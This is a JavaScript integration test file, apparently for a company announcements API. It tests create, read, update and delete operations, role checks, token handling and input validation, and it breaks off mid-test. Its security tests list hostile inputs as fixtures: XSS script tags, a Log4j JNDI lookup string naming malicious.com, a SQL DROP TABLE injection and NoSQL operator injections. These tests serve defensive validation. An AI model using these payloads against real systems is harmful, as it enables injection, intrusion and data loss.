const request = require('supertest');
const app = require('../../server');
const db = require('../../src/config/database');
const User = require('../../src/models/User');
const Announcement = require('../../src/models/Announcement');

describe('Company Announcements System Integration Tests', () => {
  let adminToken, employeeToken, managerToken;
  let adminUser, employeeUser, managerUser;
  let testAnnouncement;

  beforeAll(async () => {
    // Setup test users
    adminUser = await User.create({
      username: 'admin_test',
      email: 'admin@test.com',
      password: 'password123',
      role: 'admin'
    });

    employeeUser = await User.create({
      username: 'employee_test',
      email: 'employee@test.com',
      password: 'password123',
      role: 'employee'
    });

    managerUser = await User.create({
      username: 'manager_test',
      email: 'manager@test.com',
      password: 'password123',
      role: 'manager'
    });

    // Generate tokens
    const adminLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'admin@test.com', password: 'password123' });
    adminToken = adminLogin.body.token;

    const employeeLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'employee@test.com', password: 'password123' });
    employeeToken = employeeLogin.body.token;

    const managerLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'manager@test.com', password: 'password123' });
    managerToken = managerLogin.body.token;
  });

  afterAll(async () => {
    await Announcement.deleteMany({});
    await User.deleteMany({ username: { $in: ['admin_test', 'employee_test', 'manager_test'] } });
  });

  beforeEach(async () => {
    await Announcement.deleteMany({});
  });

  // TC-001: Announcement CRUD operations
  describe('[TC-001] Announcement CRUD Operations', () => {
    describe('[TC-001] CREATE Operation - Happy Path', () => {
      test('[TC-001-CREATE-HP] should successfully create announcement with valid data', async () => {
        const announcementData = {
          title: 'Test Announcement',
          content: 'This is a test announcement content'
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(announcementData);

        expect(response.status).toBe(201);
        expect(response.body.success).toBe(true);
        expect(response.body.data).toHaveProperty('_id');
        expect(response.body.data.title).toBe(announcementData.title);
        expect(response.body.data.content).toBe(announcementData.content);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(response.body.data.isActive).toBe(true);
        expect(response.body.data).toHaveProperty('created_at');
      });

      test('[TC-001-CREATE-HP] should auto-populate system fields correctly', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'System Fields Test',
            content: 'Testing auto-population of system fields'
          });

        expect(response.status).toBe(201);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(response.body.data.isActive).toBe(true);
        expect(new Date(response.body.data.created_at)).toBeInstanceOf(Date);
      });
    });

    describe('[TC-001] CREATE Operation - Error Path', () => {
      test('[TC-001-CREATE-EP] should fail when title is missing', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ content: 'Content without title' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('title');
      });

      test('[TC-001-CREATE-EP] should fail when content is missing', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Title without content' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('content');
      });

      test('[TC-001-CREATE-EP] should fail with empty title', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: '', content: 'Valid content' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      });

      test('[TC-001-CREATE-EP] should fail when non-admin user attempts creation', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({
            title: 'Unauthorized Creation',
            content: 'Should not be allowed'
          });

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-CREATE-EP] should handle database connection failures', async () => {
        const originalCreate = Announcement.create;
        Announcement.create = jest.fn().mockRejectedValue(new Error('Database connection failed'));

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Test Announcement',
            content: 'Test content'
          });

        expect(response.status).toBe(500);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Failed to create announcement');

        // Restore original method
        Announcement.create = originalCreate;
      });
    });

    describe('[TC-001] READ Operation - Happy Path', () => {
      beforeEach(async () => {
        // Create test announcements
        testAnnouncement = await Announcement.create({
          title: 'Test Read Announcement',
          content: 'Test read content',
          createdBy: adminUser._id,
          isActive: true
        });

        await Announcement.create({
          title: 'Second Announcement',
          content: 'Second content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-READ-HP] should retrieve all active announcements for employees', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(Array.isArray(response.body)).toBe(true);
        expect(response.body).toHaveLength(2);
        
        response.body.forEach(announcement => {
          expect(announcement).toHaveProperty('_id');
          expect(announcement).toHaveProperty('title');
          expect(announcement).toHaveProperty('content');
          expect(announcement).toHaveProperty('created_at');
          expect(announcement.isActive).toBe(true);
        });
      });

      test('[TC-001-READ-HP] should retrieve all announcements for admin', async () => {
        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(Array.isArray(response.body)).toBe(true);
        expect(response.body.length).toBeGreaterThanOrEqual(2);
      });

      test('[TC-001-READ-HP] should sort announcements by creation date (newest first)', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        const announcements = response.body;
        
        for (let i = 0; i < announcements.length - 1; i++) {
          const current = new Date(announcements[i].created_at);
          const next = new Date(announcements[i + 1].created_at);
          expect(current.getTime()).toBeGreaterThanOrEqual(next.getTime());
        }
      });

      test('[TC-001-READ-HP] should return empty array when no announcements exist', async () => {
        await Announcement.deleteMany({});

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toEqual([]);
      });
    });

    describe('[TC-001] READ Operation - Error Path', () => {
      test('[TC-001-READ-EP] should fail when unauthorized user accesses admin endpoint', async () => {
        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body.error).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-READ-EP] should handle database query failures', async () => {
        const originalFind = Announcement.find;
        Announcement.find = jest.fn().mockReturnValue({
          populate: jest.fn().mockReturnValue({
            sort: jest.fn().mockRejectedValue(new Error('Database query failed'))
          })
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(500);
        expect(response.body.error).toContain('Failed to fetch announcements');

        // Restore original method
        Announcement.find = originalFind;
      });

      test('[TC-001-READ-EP] should fail without authentication token', async () => {
        const response = await request(app)
          .get('/api/announcements');

        expect(response.status).toBe(401);
        expect(response.body.error).toBe('Access token required');
      });
    });

    describe('[TC-001] UPDATE Operation - Happy Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Original Title',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-UPDATE-HP] should successfully update announcement title and content', async () => {
        const updatedData = {
          title: 'Updated Title',
          content: 'Updated content with new information'
        };

        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send(updatedData);

        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
        expect(response.body.data.title).toBe(updatedData.title);
        expect(response.body.data.content).toBe(updatedData.content);
        expect(response.body.data._id).toBe(testAnnouncement._id.toString());
      });

      test('[TC-001-UPDATE-HP] should preserve system fields during update', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Updated Title',
            content: 'Updated content',
            createdBy: employeeUser._id, // Attempt to change system field
            created_at: new Date('2020-01-01') // Attempt to change system field
          });

        expect(response.status).toBe(200);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(new Date(response.body.data.created_at)).not.toEqual(new Date('2020-01-01'));
      });

      test('[TC-001-UPDATE-HP] should reflect changes immediately to all users', async () => {
        await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Immediately Updated',
            content: 'Should be visible immediately'
          });

        const employeeResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(employeeResponse.body[0].title).toBe('Immediately Updated');
      });
    });

    describe('[TC-001] UPDATE Operation - Error Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Test Update',
          content: 'Test content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-UPDATE-EP] should fail when announcement does not exist', async () => {
        const response = await request(app)
          .put('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(404);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('not found');
      });

      test('[TC-001-UPDATE-EP] should fail with invalid ObjectId format', async () => {
        const response = await request(app)
          .put('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-001-UPDATE-EP] should fail when non-admin user attempts update', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Unauthorized Update' });

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-UPDATE-EP] should handle database update failures', async () => {
        const originalFindByIdAndUpdate = Announcement.findByIdAndUpdate;
        Announcement.findByIdAndUpdate = jest.fn().mockRejectedValue(new Error('Database update failed'));

        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(500);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Failed to update announcement');

        // Restore original method
        Announcement.findByIdAndUpdate = originalFindByIdAndUpdate;
      });

      test('[TC-001-UPDATE-EP] should fail with empty title update', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: '', content: 'Valid content' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      });

      test('[TC-001-UPDATE-EP] should fail with empty content update', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Valid title', content: '' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      });
    });

    describe('[TC-001] DELETE Operation - Happy Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'To Be Deleted',
          content: 'This announcement will be deleted',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-DELETE-HP] should successfully delete announcement', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
        expect(response.body.message).toContain('deleted successfully');
      });

      test('[TC-001-DELETE-HP] should remove announcement from all user views immediately', async () => {
        await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        const employeeResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(employeeResponse.body).toHaveLength(0);

        const adminResponse = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(adminResponse.body.find(a => a._id === testAnnouncement._id.toString())).toBeUndefined();
      });

      test('[TC-001-DELETE-HP] should confirm deletion by attempting to fetch deleted announcement', async () => {
        await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        const fetchResponse = await request(app)
          .get(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(fetchResponse.status).toBe(404);
      });
    });

    describe('[TC-001] DELETE Operation - Error Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Test Delete',
          content: 'Test content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-DELETE-EP] should fail when announcement does not exist', async () => {
        const response = await request(app)
          .delete('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(404);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('not found');
      });

      test('[TC-001-DELETE-EP] should fail with invalid ObjectId format', async () => {
        const response = await request(app)
          .delete('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-001-DELETE-EP] should fail when non-admin user attempts deletion', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-DELETE-EP] should handle database deletion failures', async () => {
        const originalFindByIdAndDelete = Announcement.findByIdAndDelete;
        Announcement.findByIdAndDelete = jest.fn().mockRejectedValue(new Error('Database deletion failed'));

        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(500);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Failed to delete announcement');

        // Restore original method
        Announcement.findByIdAndDelete = originalFindByIdAndDelete;
      });

      test('[TC-001-DELETE-EP] should fail without authentication', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`);

        expect(response.status).toBe(401);
        expect(response.body.error).toBe('Access token required');
      });
    });
  });

  describe('[TC-SEC-001] Security and Authorization Tests', () => {
    describe('Authentication Security', () => {
      test('[TC-SEC-001-1] should reject unauthenticated requests to all endpoints', async () => {
        const endpoints = [
          { method: 'get', path: '/api/announcements' },
          { method: 'post', path: '/api/announcements' },
          { method: 'get', path: '/api/announcements/admin' },
          { method: 'put', path: '/api/announcements/507f1f77bcf86cd799439011' },
          { method: 'delete', path: '/api/announcements/507f1f77bcf86cd799439011' }
        ];

        for (const endpoint of endpoints) {
          const response = await request(app)[endpoint.method](endpoint.path);
          expect(response.status).toBe(401);
          expect(response.body.error).toBe('Access token required');
        }
      });

      test('[TC-SEC-001-2] should reject malformed Bearer tokens', async () => {
        const malformedTokens = [
          'Bearer',
          'Bearer ',
          'bearer valid_token',
          'Basic dGVzdDp0ZXN0',
          'Invalid format'
        ];

        for (const token of malformedTokens) {
          const response = await request(app)
            .get('/api/announcements')
            .set('Authorization', token);

          expect([401, 403]).toContain(response.status);
        }
      });

      test('[TC-SEC-001-3] should reject expired or invalid JWT tokens', async () => {
        const invalidTokens = [
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
          'expired_token_here',
          'tampered_token_content'
        ];

        for (const token of invalidTokens) {
          const response = await request(app)
            .get('/api/announcements')
            .set('Authorization', `Bearer ${token}`);

          expect(response.status).toBe(403);
          expect(response.body.error).toBe('Invalid or expired token');
        }
      });

      test('[TC-SEC-001-4] should prevent token reuse after user deletion', async () => {
        // Create temporary user
        const tempUser = await User.create({
          username: 'temp_user',
          email: 'temp@test.com',
          password: 'password123',
          role: 'employee'
        });

        // Generate token for temp user
        const loginResponse = await request(app)
          .post('/api/auth/login')
          .send({ email: 'temp@test.com', password: 'password123' });
        const tempToken = loginResponse.body.token;

        // Verify token works initially
        const validResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${tempToken}`);
        expect(validResponse.status).toBe(200);

        // Delete user
        await User.deleteOne({ _id: tempUser._id });

        // Token should now be invalid
        const invalidResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${tempToken}`);
        expect(invalidResponse.status).toBe(403);
      });
    });

    describe('Authorization Security', () => {
      test('[TC-SEC-001-5] should enforce role-based access control for admin endpoints', async () => {
        const adminEndpoints = [
          { method: 'get', path: '/api/announcements/admin' },
          { method: 'post', path: '/api/announcements', data: { title: 'Test', content: 'Test' } }
        ];

        const nonAdminTokens = [employeeToken, managerToken];

        for (const endpoint of adminEndpoints) {
          for (const token of nonAdminTokens) {
            const request_obj = request(app)[endpoint.method](endpoint.path)
              .set('Authorization', `Bearer ${token}`);
            
            if (endpoint.data) {
              request_obj.send(endpoint.data);
            }

            const response = await request_obj;
            expect(response.status).toBe(403);
            expect(response.body.message || response.body.error).toContain('Admin privileges required');
          }
        }
      });

      test('[TC-SEC-001-6] should prevent privilege escalation attempts', async () => {
        // Attempt to modify user role through announcement creation
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({
            title: 'Test',
            content: 'Test',
            createdBy: adminUser._id,
            role: 'admin'
          });

        expect(response.status).toBe(403);
      });

      test('[TC-SEC-001-7] should prevent cross-user data access', async () => {
        // Create announcement as admin
        const announcement = await Announcement.create({
          title: 'Admin Only',
          content: 'Secret content',
          createdBy: adminUser._id,
          isActive: true
        });

        // Employee should not be able to modify admin's announcement
        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Hacked' });

        expect(response.status).toBe(403);
      });
    });

    describe('Input Validation Security', () => {
      test('[TC-SEC-001-8] should sanitize and validate announcement content', async () => {
        const maliciousInputs = [
          {
            title: '<script>alert("XSS")</script>',
            content: 'Normal content',
            expectedStatus: 400
          },
          {
            title: 'Normal title',
            content: '<img src=x onerror=alert("XSS")>',
            expectedStatus: 400
          },
          {
            title: '${jndi:ldap://malicious.com/a}',
            content: 'Log4j injection attempt',
            expectedStatus: 400
          },
          {
            title: "'; DROP TABLE announcements; --",
            content: 'SQL injection attempt',
            expectedStatus: 400
          }
        ];

        for (const input of maliciousInputs) {
          const response = await request(app)
            .post('/api/announcements')
            .set('Authorization', `Bearer ${adminToken}`)
            .send(input);

          expect(response.status).toBe(input.expectedStatus);
          if (response.status === 400) {
            expect(response.body.message).toContain('Invalid content format');
          }
        }
      });

      test('[TC-SEC-001-9] should prevent NoSQL injection in queries', async () => {
        const maliciousQueries = [
          { id: '{"$ne": null}' },
          { id: '{"$regex": ".*"}' },
          { id: '{"$where": "this.title.length > 0"}' }
        ];

        for (const query of maliciousQueries) {
          const response = await request(app)
            .get(`/api/announcements/${query.id}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect([400, 404]).toContain(response.status);
        }
      });

      test('[TC-SEC-001-10] should validate request size limits', async () => {
        const oversizedPayload = {
          title: 'A'.repeat(10000),
          content: 'B'.repeat(100000)
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(oversizedPayload);

        expect([400, 413]).toContain(response.status);
      });

      test('[TC-SEC-001-11] should validate ObjectId format in parameters', async () => {
        const invalidIds = ['invalid', '123', 'not-an-objectid', ''];

        for (const id of invalidIds) {
          const response = await request(app)
            .get(`/api/announcements/${id}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect(response.status).toBe(400);
          expect(response.body.message).toContain('Invalid ID format');
        }
      });
    });

    describe('Rate Limiting and DoS Protection', () => {
      test('[TC-SEC-001-12] should implement rate limiting for announcement creation', async () => {
        const requests = Array.from({ length: 20 }, (_, i) =>
          request(app)
            .post('/api/announcements')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
              title: `Spam announcement ${i}`,
              content: `Spam content ${i}`
            })
        );

        const responses = await Promise.all(requests);
        const rateLimitedResponses = responses.filter(r => r.status === 429);
        
        // Should have some rate limited responses
        expect(rateLimitedResponses.length).toBeGreaterThan(0);
      });

      test('[TC-SEC-001-13] should handle concurrent unauthorized access attempts', async () => {
        const maliciousRequests = Array.from({ length: 10 }, () =>
          request(app)
            .post('/api/announcements')
            .set('Authorization', 'Bearer fake_token')
            .send({ title: 'Attack', content: 'Attack' })
        );

        const responses = await Promise.all(maliciousRequests);
        
        // All should be unauthorized
        responses.forEach(response => {
          expect(response.status).toBe(403);
        });
      });
    });

    describe('Data Integrity and Security', () => {
      test('[TC-SEC-001-14] should prevent announcement tampering', async () => {
        const announcement = await Announcement.create({
          title: 'Original',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });

        // Attempt to tamper with system fields
        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Updated',
            content: 'Updated content',
            createdBy: employeeUser._id, // Should not be modifiable
            created_at: new Date('2020-01-01'), // Should not be modifiable
            _id: 'different_id' // Should not be modifiable
          });

        expect(response.status).toBe(200);
        
        // Verify system fields weren't tampered with
        const updatedAnnouncement = await Announcement.findById(announcement._id);
        expect(updatedAnnouncement.createdBy.toString()).toBe(adminUser._id.toString());
        expect(updatedAnnouncement._id.toString()).toBe(announcement._id.toString());
      });

      test('[TC-SEC-001-15] should audit security events', async () => {
        // Attempt unauthorized access
        await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Unauthorized', content: 'Test' });

        // Security events should be logged (implementation dependent)
        // This test verifies the endpoint properly handles and logs security violations
        expect(true).toBe(true); // Placeholder for audit log verification
      });
    });

    describe('Session and Token Security', () => {
      test('[TC-SEC-001-16] should handle token expiry gracefully', async () => {
        // This would require a short-lived test token
        // For now, we test the error handling path
        const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid';
        
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${expiredToken}`);

        expect(response.status).toBe(403);
        expect(response.body.error).toBe('Invalid or expired token');
      });

      test('[TC-SEC-001-17] should prevent session fixation', async () => {
        // Generate fresh token
        const loginResponse1 = await request(app)
          .post('/api/auth/login')
          .send({ email: 'admin@test.com', password: 'password123' });
        
        // Generate another token for same user
        const loginResponse2 = await request(app)
          .post('/api/auth/login')
          .send({ email: 'admin@test.com', password: 'password123' });

        // Both tokens should be valid and different
        expect(loginResponse1.body.token).not.toBe(loginResponse2.body.token);
        
        const response1 = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${loginResponse1.body.token}`);
        
        const response2 = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${loginResponse2.body.token}`);

        expect(response1.status).toBe(200);
        expect(response2.status).toBe(200);
      });
    });
  });

  describe('[TC-AN-001] Admin user navigates to announcements management', () => {
    test('[TC-AN-001-HP] should show announcement creation form for admin user', async () => {
      const response = await request(app)
        .get('/api/announcements/admin')
        .set('Authorization', `Bearer ${adminToken}`);

      expect(response.status).toBe(200);
      expect(response.body).toEqual(expect.arrayContaining([]));
    });

    test('[TC-AN-001-HP] should allow admin to access announcement creation endpoint', async () => {
      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          title: 'Test Announcement',
          content: 'This is a test announcement content'
        });

      expect(response.status).toBe(201);
      expect(response.body.success).toBe(true);
      expect(response.body.data.title).toBe('Test Announcement');
    });

    test('[TC-AN-001-EP] should handle admin access when database is unavailable', async () => {
      // Mock database connection failure
      const originalFind = Announcement.find;
      Announcement.find = jest.fn().mockRejectedValue(new Error('Database connection failed'));

      const response = await request(app)
        .get('/api/announcements/admin')
        .set('Authorization', `Bearer ${adminToken}`);

      expect(response.status).toBe(500);
      expect(response.body.error).toContain('Internal server error');

      // Restore original method
      Announcement.find = originalFind;
    });
  });

  describe('[TC-AN-002] Admin creates and publishes new announcement', () => {
    test('[TC-AN-002-HP] should save announcement to database and make it visible immediately', async () => {
      const announcementData = {
        title: 'Company Update',
        content: 'Important company-wide update for all employees'
      };

      // Create announcement
      const createResponse = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(announcementData);

      expect(createResponse.status).toBe(201);
      expect(createResponse.body.success).toBe(true);
      testAnnouncement = createResponse.body.data;

      // Verify it's immediately visible to employees
      const dashboardResponse = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(dashboardResponse.status).toBe(200);
      const announcements = dashboardResponse.body;
      expect(announcements).toHaveLength(1);
      expect(announcements[0].title).toBe('Company Update');
      expect(announcements[0].content).toBe('Important company-wide update for all employees');
    });

    test('[TC-AN-002-EP] should validate required fields when creating announcement', async () => {
      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ title: '' });

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('Validation errors');
    });

    test('[TC-AN-002-EP] should handle database save failures during announcement creation', async () => {
      const originalCreate = Announcement.create;
      Announcement.create = jest.fn().mockRejectedValue(new Error('Database save failed'));

      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          title: 'Test Announcement',
          content: 'Test content'
        });

      expect(response.status).toBe(500);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('Failed to create announcement');

      // Restore original method
      Announcement.create = originalCreate;
    });
  });

  describe('[TC-AN-003] Employee views announcements on dashboard', () => {
    beforeEach(async () => {
      // Create test announcements
      await Announcement.create({
        title: 'First Announcement',
        content: 'First announcement content',
        createdBy: adminUser._id,
        isActive: true
      });

      await Announcement.create({
        title: 'Second Announcement',
        content: 'Second announcement content',
        createdBy: adminUser._id,
        isActive: true
      });
    });

    test('[TC-AN-003-HP] should display all active announcements with title, content, and publish date', async () => {
      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(200);
      expect(response.body).toHaveLength(2);
      
      response.body.forEach(announcement => {
        expect(announcement).toHaveProperty('title');
        expect(announcement).toHaveProperty('content');
        expect(announcement).toHaveProperty('created_at');
        expect(announcement.title).toBeTruthy();
        expect(announcement.content).toBeTruthy();
      });
    });

    test('[TC-AN-003-HP] should sort announcements by creation date (newest first)', async () => {
      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(200);
      const announcements = response.body;
      
      for (let i = 0; i < announcements.length - 1; i++) {
        const current = new Date(announcements[i].created_at);
        const next = new Date(announcements[i + 1].created_at);
        expect(current.getTime()).toBeGreaterThanOrEqual(next.getTime());
      }
    });

    test('[TC-AN-003-EP] should handle empty announcements list gracefully', async () => {
      await Announcement.deleteMany({});

      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(200);
      expect(response.body).toEqual([]);
    });

    test('[TC-AN-003-EP] should handle database query failures when fetching announcements', async () => {
      const originalFind = Announcement.find;
      Announcement.find = jest.fn().mockReturnValue({
        populate: jest.fn().mockReturnValue({
          sort: jest.fn().mockRejectedValue(new Error('Database query failed'))
        })
      });

      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(500);
      expect(response.body.error).toContain('Failed to fetch announcements');

      // Restore original method
      Announcement.find = originalFind;
    });
  });

  describe('[TC-AN-004] Non-admin user access restrictions', () => {
    test('[TC-AN-004-EP] should deny employee access to announcement creation interface', async () => {
      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`)
        .send({
          title: 'Unauthorized Announcement',
          content: 'This should not be allowed'
        });

      expect(response.status).toBe(403);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toBe('Access denied. Admin privileges required.');
    });

    test('[TC-AN-004-EP] should deny manager access to announcement creation interface', async () => {
      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${managerToken}`)
        .send({
          title: 'Manager Announcement',
          content: 'Manager trying to create announcement'
        });

      expect(response.status).toBe(403);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toBe('Access denied. Admin privileges required.');
    });

    test('[TC-AN-004-EP] should deny employee access to admin announcement management', async () => {
      const response = await request(app)
        .get('/api/announcements/admin')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(403);
      expect(response.body.error).toBe('Access denied. Admin privileges required.');
    });

    test('[TC-AN-004-HP] should allow employee to view public announcements despite creation restrictions', async () => {
      // Create announcement as admin
      await Announcement.create({
        title: 'Public Announcement',
        content: 'This should be visible to employees',
        createdBy: adminUser._id,
        isActive: true
      });

      // Employee should still be able to view
      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(200);
      expect(response.body).toHaveLength(1);
      expect(response.body[0].title).toBe('Public Announcement');
    });
  });

  describe('[TC-AN-005] Admin edits and deletes announcements', () => {
    beforeEach(async () => {
      testAnnouncement = await Announcement.create({
        title: 'Original Title',
        content: 'Original content',
        createdBy: adminUser._id,
        isActive: true
      });
    });

    test('[TC-AN-005-HP] should allow admin to edit announcement content', async () => {
      const updatedData = {
